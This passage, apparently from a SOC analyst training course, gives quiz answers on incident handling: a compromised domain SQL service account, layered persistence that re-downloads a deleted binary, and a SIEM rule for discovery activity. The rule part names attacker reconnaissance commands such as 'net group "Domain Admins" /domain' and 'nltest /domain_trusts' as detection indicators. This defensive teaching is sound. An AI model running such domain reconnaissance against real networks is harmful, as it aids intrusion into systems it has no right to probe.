    The **account matters** because it is what the attacker now is on the OS: `CORP\svc_sql` is a **domain** service account, so the attacker can query AD and possibly reach other servers with it. If that account has broad rights (or is in Domain Admins), this is already a domain-level incident. Next steps: find how they got `sysadmin` (SQL logins, injection in an app), reset `svc_sql`, check where else it logged on, and hunt for what else the shell ran.

### Question 2

The SOC found `odsync.exe` via an antivirus alert, deleted it and the `OneDriveSync` Run key, and closed the case. Two hours later the same alert fires on the same laptop. Explain the most likely reason and how the analyst should have handled the first case.

??? success "Answer and explanation"
    The attacker used **layered persistence**. Most likely a **scheduled task** (like the hourly hidden task in the 4698 example) checks whether `odsync.exe` exists and **re-downloads it** if it's gone — so removing the file and Run key only triggered the re-download. Other candidates: a service, a WMI subscription, a Startup-folder item, or a remote-management tool the attacker installed.

    Correct handling: when one persistence mechanism is found, **assume there are more**. Look at the process tree and timeline around the original infection (what created the file? what else did that process write — Sysmon 11/13, 4698, 7045, 4720?), sweep all common autostart locations (an autoruns-style tool or EDR query), check the proxy logs for the download domain from other hosts, and either remove **all** mechanisms and verify over time, or **re-image** the laptop. Also consider credentials used on that machine as exposed.

### Question 3

A colleague proposes a SIEM rule: "Alert whenever `whoami.exe`, `net.exe` or `ipconfig.exe` is executed." Why is this a bad rule, and what would you propose instead? Give at least three conditions that make discovery activity suspicious.

??? success "Answer and explanation"
    These are **living-off-the-land** tools that admins, scripts, installers and inventory agents run constantly. On thousands of machines the rule would fire thousands of times a day; analysts would learn to ignore it and it would be switched off — and real discovery would still be missed in the noise.

    Better: detect the **pattern**, not the command. For example, alert when, on one host, **four or more different discovery tools** run **within a few minutes** from the **same parent process or account**, excluding baselined management agents. Conditions that raise suspicion:

    - An **unusual parent** — an unknown binary in `AppData`/`ProgramData`/`Temp`, Office, a web server worker (`w3wp.exe`) or database engine (`sqlservr.exe`).
    - An **unusual account** — a service account or a non-IT user running domain queries (`net group "Domain Admins" /domain`, `nltest /domain_trusts`).
    - **Speed and order** — many commands in seconds, following the classic who-am-I → network → accounts → admins → DCs → trusts sequence.
    - **Domain-wide queries from a workstation**, or bursts of LDAP queries to DCs.
    - Discovery that **follows another alert** on the same host (Office → PowerShell, a new Run key) — combine signals.

## Related references { #related }

- [Initial Exploitation](initial-exploitation.md) — the step before this one
- [Persistence — services, tasks, Run keys](../../../adversary/persistence.md) · [LOLBins](../../../adversary/lolbins.md) · [WMI and WinRM execution](../../../adversary/wmi-winrm.md)
- [PowerShell download cradles](../../../adversary/powershell-cradles.md) · [Impair defenses and log clearing](../../../adversary/impair-defenses-log-clearing.md)
- [Windows event IDs](../../../basics/windows-event-ids.md) · [Linux commands](../../../basics/linux-commands.md)
